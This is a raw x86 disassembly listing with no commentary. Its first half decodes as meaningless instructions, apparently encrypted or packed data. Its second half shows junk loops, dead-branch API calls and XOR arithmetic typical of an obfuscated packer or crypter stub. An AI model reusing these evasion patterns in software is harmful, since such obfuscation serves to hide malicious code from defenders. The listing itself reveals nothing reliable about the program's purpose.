  41605b:	jmp    esi
  41605d:	mov    BYTE PTR [ecx-0x31609fe0],dh
  416063:	adc    DWORD PTR [ebx+0x5c],ebp
  416066:	xchg   esi,eax
  416067:	test   DWORD PTR [esi],ecx
  416069:	sbb    dh,BYTE PTR [bx+0x799d]
  41606e:	and    bh,ch
  416070:	loopne 0x41607d
  416072:	(bad)  
  416074:	icebp  
  416075:	mov    ebp,0x47931e59
  41607a:	(bad)  [eax]
  41607c:	dec    ebx
  41607d:	mov    ebx,0xc09b2b3f
  416082:	sbb    esi,DWORD PTR [esi+ebx*1]
  416085:	cmp    al,0xe1
  416087:	cmp    BYTE PTR [ecx-0x5d31e35f],dl
  41608d:	ror    BYTE PTR [eax+0x28],0x2e
  416091:	cmp    dh,dh
  416093:	mov    esi,0xce2b2c1a
  416098:	mov    eax,ds:0x8890a43e
  41609d:	pop    esi
  41609e:	loopne 0x4160bf
  4160a0:	jmp    DWORD PTR [eax]
  4160a2:	adc    eax,0x387fc561
  4160a7:	adc    BYTE PTR [esi],bl
  4160a9:	jmp    0x4160f3
  4160ab:	mov    esp,0x9c38753b
  4160b0:	cmp    bl,al
  4160b2:	lods   eax,DWORD PTR ds:[esi]
  4160b3:	pop    ebx
  4160b4:	inc    ebx
  4160b5:	dec    edi
  4160b6:	jb     0x4160ad
  4160b8:	or     eax,0x23b8858a
  4160bd:	shl    BYTE PTR [ebp+0x13],0x34
  4160c1:	lods   eax,DWORD PTR ds:[esi]
  4160c2:	not    cl
  4160c4:	out    0x75,eax
  4160c6:	inc    eax
  4160c7:	into   
  4160c8:	scas   eax,DWORD PTR es:[edi]
  4160c9:	sub    al,0xa7
  4160cc:	gs sub eax,0xfc88873a
  4160d2:	pop    esp
  4160d3:	sub    eax,0x476e06bd
  4160d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160d9:	int3   
  4160da:	xchg   edi,eax
  4160db:	clc    
  4160dc:	sub    esi,esp
  4160de:	retf   
  4160df:	test   eax,0x33cff9f9
  4160e4:	push   eax
  4160e5:	sub    ebx,eax
  4160e7:	push   0xffffffab
  4160e9:	pop    ebp
  4160ea:	push   eax
  4160eb:	xchg   ecx,eax
  4160ec:	sti    
  4160ed:	fsub   st,st(2)
  4160ef:	pusha  
  4160f0:	push   ss
  4160f1:	daa    
  4160f2:	xchg   BYTE PTR [eax],al
  4160f4:	out    0x91,eax
  4160f6:	nop
  4160f7:	mov    ds:0x1b1ca1c1,eax
  4160fc:	adc    DWORD PTR [eax+edx*2+0x18],ecx
  416100:	std    
  416101:	std    
  416102:	fwait
  416103:	jmp    0x41614f
  416105:	jecxz  0x4160da
  416107:	mov    bh,0x1b
  416109:	mov    ch,0x92
  41610b:	xor    eax,0x6b0ed21e
  416110:	lods   eax,DWORD PTR es:[esi]
  416112:	cld    
  416113:	push   edi
  416114:	mov    ebx,0xfb701334
  416119:	out    dx,eax
  41611a:	es push ebx
  41611c:	es dec ebx
  41611e:	adc    eax,0x744c278f
  416123:	mov    DWORD PTR [eax+0x52cc6899],ecx
  416129:	adc    ah,ah
  41612b:	jae    0x416143
  41612d:	(bad)  
  41612e:	lods   eax,DWORD PTR ds:[esi]
  41612f:	leave  
  416130:	mov    dl,0xa1
  416132:	int3   
  416133:	xlat   BYTE PTR ds:[ebx]
  416134:	leave  
  416135:	mov    dl,BYTE PTR [ecx-0x78]
  416138:	imul   edx,DWORD PTR [esi+0x21],0x44
  41613c:	mov    ebp,0x2cb23ff5
  416141:	mov    dh,0x1c
  416143:	inc    edx
  416144:	jb     0x416174
  416146:	mov    esp,0x75ee4757
  41614b:	xor    edi,DWORD PTR [edi+eax*8]
  41614e:	ret    
  41614f:	fld    TBYTE PTR [ebp+0x448417bc]
  416155:	inc    esi
  416156:	pop    es
  416157:	xor    BYTE PTR [ebx-0x1d098007],cl
  41615d:	pop    edi
  41615e:	and    ch,dl
  416160:	push   edx
  416161:	loope  0x41612e
  416163:	pop    ss
  416164:	inc    ecx
  416165:	jmp    0xa012ebbc
  41616a:	cmp    al,0x5e
  41616c:	jb     0x416158
  41616e:	cmp    al,dl
  416170:	cmp    ebx,esi
  416172:	mov    al,ds:0x5add9454
  416177:	ja     0x41617b
  416179:	xlat   BYTE PTR ds:[ebx]
  41617a:	xor    DWORD PTR [edi-0x324b87f3],esi
  416180:	clc    
  416181:	in     al,dx
  416182:	iret   
  416183:	push   0xffffffb4
  416185:	xchg   ecx,eax
  416186:	push   esp
  416187:	inc    ebp
  416188:	in     al,dx
  416189:	aam    0xf1
  41618b:	jne    0x41619f
  41618d:	mov    ah,0x72
  41618f:	inc    ecx
  416190:	(bad)  
  416191:	cmp    edi,eax
  416193:	popf   
  416194:	dec    edi
  416195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416196:	dec    eax
  416197:	mov    al,0xc6
  416199:	push   es
  41619a:	inc    edx
  41619b:	adc    al,0x76
  41619d:	(bad)  
  41619e:	jo     0x416207
  4161a0:	pop    ebp
  4161a1:	sub    DWORD PTR [edx-0x45404c52],ecx
  4161a7:	xchg   BYTE PTR [ebp-0xe],bl
  4161aa:	jnp    0x416225
  4161ac:	sub    ebx,DWORD PTR [edx]
  4161ae:	arpl   WORD PTR [edx],sp
  4161b0:	dec    ecx
  4161b1:	sbb    BYTE PTR [ebx-0x66],bh
  4161b4:	jb     0x416168
  4161b6:	iret   
  4161b7:	repnz cmp dl,BYTE PTR [esi+0x39]
  4161bb:	fdiv   QWORD PTR [ecx]
  4161bd:	(bad)
  4161c1:	int3   
  4161c2:	retf   
  4161c3:	push   eax
  4161c4:	ss jp  0x4161d9
  4161c7:	push   edi
  4161c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161c9:	(bad)  
  4161ca:	xor    al,0xc7
  4161cc:	cmp    eax,0x4b4a7dd4
  4161d1:	xor    ah,BYTE PTR [ebx-0x45a05435]
  4161d7:	pop    ds
  4161d8:	adc    al,bl
  4161da:	lods   eax,DWORD PTR ds:[esi]
  4161db:	jno    0x4161d7
  4161dd:	ds int 0x35
  4161e0:	aam    0xc3
  4161e2:	mov    cl,0x9e
  4161e4:	into   
  4161e5:	not    esi
  4161e7:	pop    esp
  4161e8:	adc    al,0x88
  4161ea:	inc    esp
  4161eb:	repnz fisttp WORD PTR gs:[ebp+0x4b4ea95c]
  4161f3:	xchg   ecx,eax
  4161f4:	mov    fs,WORD PTR [edi-0x6f]
  4161f7:	xrstors [edi-0x7f]
  4161fb:	imul   DWORD PTR [ecx+ecx*1-0x70]
  4161ff:	sbb    BYTE PTR [edx],dh
  416201:	addr16 jb 0x41621a
  416204:	push   ecx
  416205:	mov    al,0x95
  416207:	adc    BYTE PTR [ecx-0x6c],al
  41620a:	lds    bx,DWORD PTR [ebx+0x1f]
  41620e:	aaa    
  41620f:	xchg   BYTE PTR [eax-0x3584366c],dl
  416215:	imul   ebp,DWORD PTR [ebp-0x1cd27708],0x2fd485b0
  41621f:	scas   al,BYTE PTR es:[edi]
  416220:	inc    eax
  416221:	(bad)  
  416223:	stos   DWORD PTR es:[edi],eax
  416224:	out    0xde,eax
  416226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416227:	loop   0x4162a5
  416229:	sub    edi,ecx
  41622b:	adc    eax,0x7bb71fd5
  416230:	pop    ebx
  416231:	sub    DWORD PTR [ecx+0x69],ebp
  416234:	mov    DWORD PTR [edi+0x4b],ecx
  416237:	scas   eax,DWORD PTR es:[edi]
  416238:	rol    DWORD PTR [ecx+0x75],cl
  41623b:	pop    eax
  41623c:	shr    DWORD PTR [esp+eax*4-0x7539c37a],cl
  416243:	out    0x8c,al
  416245:	daa    
  416246:	imul   ebp,DWORD PTR [ecx],0xffcdb929
  41624c:	(bad)  
  41624e:	sbb    DWORD PTR [esi+edx*1-0x61],ebp
  416252:	inc    ecx
  416253:	mov    al,0x2d
  416256:	jecxz  0x41620f
  416258:	pop    es
  416259:	and    ah,BYTE PTR [edx]
  41625b:	mov    bh,0xaa
  41625d:	jnp    0x416265
  41625f:	stos   DWORD PTR es:[edi],eax
  416260:	add    DWORD PTR [esi+0x7d],esi
  416263:	sub    ebx,DWORD PTR [edx+0x6dc1866e]
  416269:	cli    
  41626a:	or     BYTE PTR [ebx+0x7b],al
  41626d:	loope  0x4162c5
  41626f:	pop    esp
  416270:	and    al,0x8e
  416272:	aas    
  416273:	(bad)  
  416274:	mov    ebp,0x84baf0aa
  416279:	(bad)  
  41627a:	clc    
  41627b:	in     al,0x3c
  41627d:	test   BYTE PTR [ebx],al
  41627f:	push   ds
  416280:	or     esp,0xffffffeb
  416283:	shl    BYTE PTR [esi],0x46
  416286:	mov    ah,dl
  416288:	mov    ebx,0x3b888aec
  41628d:	outs   dx,BYTE PTR ds:[esi]
  41628e:	stos   DWORD PTR es:[edi],eax
  41628f:	mov    edi,0xb8e10a5f
  416294:	push   0xffffffaa
  416296:	ins    BYTE PTR es:[edi],dx
  416297:	(bad)  [esi+0x51]
  41629a:	lea    edx,[eax+0x2c4e2412]
  4162a0:	mov    esp,eax
  4162a2:	aam    0x73
  4162a4:	add    ecx,DWORD PTR [edi+0x2e]
  4162a7:	pcmpgtd mm3,QWORD PTR [edx-0x65b0bdaa]
  4162ae:	call   0x1f0d02a0
  4162b3:	js     0x4162d5
  4162b5:	stos   DWORD PTR es:[edi],eax
  4162b6:	addr16 rcl eax,0xef
  4162ba:	and    al,0xb3
  4162bc:	in     eax,dx
  4162bd:	cmc    
  4162be:	mov    edx,0x9a8874ae
  4162c3:	or     DWORD PTR [esp+edx*8-0x54],0xffffffa8
  4162c8:	aam    0x75
  4162ca:	jbe    0x416279
  4162cc:	mov    ds,WORD PTR [ebx]
  4162ce:	sub    DWORD PTR [edi],0x98ef5c8e
  4162d4:	pop    ecx
  4162d5:	mov    dl,0x96
  4162d7:	fwait
  4162d8:	in     eax,0xe3
  4162da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162db:	lods   al,BYTE PTR ds:[esi]
  4162dc:	sbb    al,0x5d
  4162de:	aas    
  4162df:	popf   
  4162e0:	or     al,0x33
  4162e2:	adc    al,0xc9
  4162e4:	ins    BYTE PTR es:[edi],dx
  4162e5:	sub    ebx,ebx
  4162e7:	push   0xafed5ba3
  4162ec:	into   
  4162ed:	fwait
  4162ee:	add    dl,BYTE PTR [edi+eiz*8-0x76c6a1a1]
  4162f5:	push   ss
  4162f6:	pop    ecx
  4162f7:	xchg   esp,eax
  4162f8:	jo     0x41633e
  4162fa:	hlt    
  4162fb:	sub    al,0xbc
  4162fd:	imul   edi,DWORD PTR [eax+eax*4-0x6adaaf44],0x914d122d
  416308:	xchg   DWORD PTR [eax],esi
  41630a:	cmc    
  41630b:	dec    esp
  41630c:	out    0xd6,eax
  41630e:	mov    ds:0x55fdcbaa,eax
  416313:	xchg   esi,eax
  416314:	sbb    al,0xc3
  416316:	test   ch,cl
  416318:	mov    ds:0x91406431,al
  41631d:	sub    edi,DWORD PTR [ecx+0x1591a367]
  416323:	jae    0x41632d
  416325:	and    DWORD PTR [esi-0x60],ecx
  416328:	jle    0x4163a6
  41632a:	mov    DWORD PTR [ebx-0x5db36d52],edx
  416330:	test   al,0x36
  416332:	hlt    
  416333:	sub    al,0xb7
  416335:	mov    edx,0x8ce27c2b
  41633a:	sbb    BYTE PTR [ebx+0x1a],ch
  41633d:	outs   dx,BYTE PTR ds:[esi]
  41633e:	mov    ds:0xd4810c9f,al
  416343:	pushf  
  416344:	sbb    DWORD PTR [ebx-0x4b3cd6bc],0x26
  41634b:	adc    eax,0x8ff70676
  416350:	popa   
  416351:	xor    DWORD PTR [esi-0x4e],ebp
  416354:	dec    ebp
  416355:	les    ebp,FWORD PTR [edi-0x258191da]
  41635b:	cs retf 0x22e6
  41635f:	sbb    ebx,DWORD PTR [ecx]
  416361:	mov    ds:0xa9c5a802,eax
  416366:	xchg   edx,eax
  416367:	mov    WORD PTR [edx-0x5849fba2],cs
  41636d:	xchg   ebp,eax
  41636e:	cmp    DWORD PTR ds:0x97ac574,eax
  416374:	inc    ebp
  416375:	jb     0x41636a
  416377:	add    eax,0x1fdad327
  41637c:	cdq    
  41637d:	or     al,0x8a
  41637f:	jge    0x41632d
  416381:	jnp    0x41630c
  416383:	fimul  WORD PTR [ecx+0x17]
  416386:	fmul   QWORD PTR [eax-0xc]
  416389:	test   BYTE PTR [esi],ah
  41638b:	ret    
  41638c:	call   0x69d3:0xf54e7fd0
  416393:	push   ss
  416394:	adc    BYTE PTR [ecx-0x73],al
  416397:	mov    al,ds:0x3e067cdd
  41639c:	les    ecx,FWORD PTR [eax]
  41639e:	xor    ebp,DWORD PTR [ecx+0x70]
  4163a1:	sub    DWORD PTR [eax+eax*4],esi
  4163a4:	idiv   BYTE PTR [esi]
  4163a6:	pop    edi
  4163a7:	icebp  
  4163a8:	ds (bad) 
  4163aa:	push   ebx
  4163ab:	and    WORD PTR ds:0xf05f5fb4,dx
  4163b2:	adc    ch,ah
  4163b4:	(bad)  
  4163b5:	jo     0x416386
  4163b7:	int    0x86
  4163b9:	ds pop ecx
  4163bb:	fs mov ch,0xbb
  4163be:	pop    eax
  4163bf:	jmp    0x8d37cd53
  4163c4:	dec    ebp
  4163c6:	mov    es,edi
  4163c8:	jge    0x4163f4
  4163ca:	add    ebp,DWORD PTR [ecx+0x7f]
  4163cd:	jbe    0x41638a
  4163cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163d0:	mov    ds:0xe562f163,al
  4163d5:	inc    ebx
  4163d6:	vpaddusw ymm4,ymm2,YMMWORD PTR [edx+ebx*4-0x71]
  4163dc:	mov    ebp,0x16dc45cb
  4163e1:	pop    esi
  4163e2:	fisub  DWORD PTR [edx]
  4163e4:	pop    esp
  4163e5:	outs   dx,BYTE PTR ds:[esi]
  4163e6:	mov    ebx,0xbaab5341
  4163eb:	imul   ecx,DWORD PTR [ebx-0x4e],0x3e
  4163ef:	fidiv  WORD PTR [ebx-0x6b]
  4163f2:	jne    0x4163d5
  4163f4:	gs adc eax,0xad9e0040
  4163fa:	call   0x9c0919ab
  4163ff:	xor    DWORD PTR [eax],edi
  416401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416402:	lods   eax,DWORD PTR ds:[esi]
  416403:	(bad)  
  416404:	jecxz  0x4163d5
  416406:	xchg   ebx,eax
  416407:	cmp    BYTE PTR [ebp+0x5c],bl
  41640a:	jecxz  0x416457
  41640c:	jo     0x4163c3
  41640e:	gs loopne 0x416410
  416411:	es retf 
  416413:	jae    0x4163ec
  416415:	retf   0x7d96
  416418:	mov    ecx,0x979a63d2
  41641d:	fwait
  41641e:	das    
  41641f:	and    bh,ch
  416421:	mov    al,ds:0x463b1a51
  416426:	call   0x36ae:0xd4183535
  41642d:	out    0x6b,al
  41642f:	mov    ah,BYTE PTR [ebx-0x7831321d]
  416435:	mov    dh,bl
  416437:	repnz mov eax,0x9928a4be
  41643d:	xchg   BYTE PTR [eax],bh
  41643f:	div    BYTE PTR [eax-0x49566d34]
  416445:	cvtdq2ps xmm7,xmm1
  416448:	sub    al,0xbc
  41644a:	bound  esi,QWORD PTR [esi+ecx*8-0x4ccf32]
  416451:	jmp    0x41648e
  416453:	cld    
  416454:	test   DWORD PTR [edi+0x55],ebp
  416457:	xchg   BYTE PTR [esi],bl
  416459:	ins    BYTE PTR es:[edi],dx
  41645a:	rol    BYTE PTR [edx+0x2f8c0875],0xbf
  416461:	fdiv   st,st(5)
  416463:	xor    cl,BYTE PTR [eax*1+0x2ed90afb]
  41646a:	adc    DWORD PTR [edi-0x40],edx
  41646d:	test   eax,0x368f7dd0
  416472:	or     eax,0x7261e2d1
  416477:	adc    BYTE PTR [ebx],bh
  416479:	(bad)  
  41647a:	(bad)  
  41647c:	push   esp
  41647d:	push   edi
  41647e:	adc    DWORD PTR [edx-0x115e724a],ebx
  416484:	push   0xffffffea
  416486:	push   es
  416487:	xchg   eax,ebx
  416489:	sub    al,0xc5
  41648b:	test   dl,ah
  41648d:	out    dx,al
  41648e:	fisub  DWORD PTR [ecx-0x5c]
  416491:	repz mov ecx,0xe978293b
  416497:	xor    ecx,edx
  416499:	inc    ecx
  41649a:	sbb    al,0x72
  41649c:	adc    bl,cl
  41649e:	dec    edx
  41649f:	into   
  4164a0:	ror    DWORD PTR [ebx+0x6318db3f],cl
  4164a6:	xchg   ebx,eax
  4164a7:	add    BYTE PTR [esi+0x2],bh
  4164aa:	push   ebp
  4164ab:	xor    eax,0xdee9df72
  4164b0:	popa   
  4164b1:	stos   DWORD PTR es:[edi],eax
  4164b2:	das    
  4164b3:	and    DWORD PTR ds:0x448c3c41,ebx
  4164b9:	imul   esi,DWORD PTR [ebp+0x6304d5fa],0xffffffc4
  4164c0:	aas    
  4164c1:	adc    DWORD PTR [edx-0x17bb4f85],esp
  4164c7:	jmp    0x9a911e8
  4164cc:	test   al,0x2f
  4164ce:	mov    dl,0x96
  4164d0:	addr16 cwde 
  4164d2:	fdivr  st,st(0)
  4164d4:	push   ds
  4164d5:	mov    al,0xf0
  4164d7:	and    esi,DWORD PTR [ebx+0x11d303a9]
  4164dd:	sub    BYTE PTR [edi+0x776a5b80],cl
  4164e3:	and    DWORD PTR [esi],0xfccc717
  4164e9:	das    
  4164ea:	(bad)  
  4164eb:	lods   al,BYTE PTR ds:[esi]
  4164ec:	int3   
  4164ed:	(bad)  
  4164ee:	out    0x8a,eax
  4164f0:	hlt    
  4164f1:	or     dl,BYTE PTR [eax]
  4164f3:	mov    ?,WORD PTR [ebp+esi*8-0x5fd18ee0]
  4164fa:	test   eax,0x563dd62f
  4164ff:	sahf   
  416500:	mov    ebx,0xb8aacc16
  416505:	sbb    eax,0x95842f70
  41650a:	sub    ebp,edx
  41650c:	hlt    
  41650d:	xor    ch,BYTE PTR [edx-0x62]
  416510:	pop    es
  416511:	xor    eax,0x397d99d4
  416516:	sbb    ah,cl
  416518:	push   0x5
  41651a:	es jmp 0x80701001
  416520:	xor    DWORD PTR [eax+eiz*8-0x6d5be920],ebx
  416527:	out    0x8f,al
  416529:	mov    esp,cs
  41652b:	sbb    eax,0x570cc040
  416530:	ins    BYTE PTR es:[edi],dx
  416531:	shr    BYTE PTR [esi-0xb31194f],0x87
  416538:	mov    dh,0x0
  41653a:	push   0x88e4438
  41653f:	in     eax,dx
  416540:	cmp    bh,cl
  416542:	push   cs
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42aa33
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42aa37
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42aa3b
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42aa3f
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42aa0b
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42974f
  416825:	mov    ebx,DWORD PTR ds:0x429bcf
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42aa0f
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42aa13
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42aa1b
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
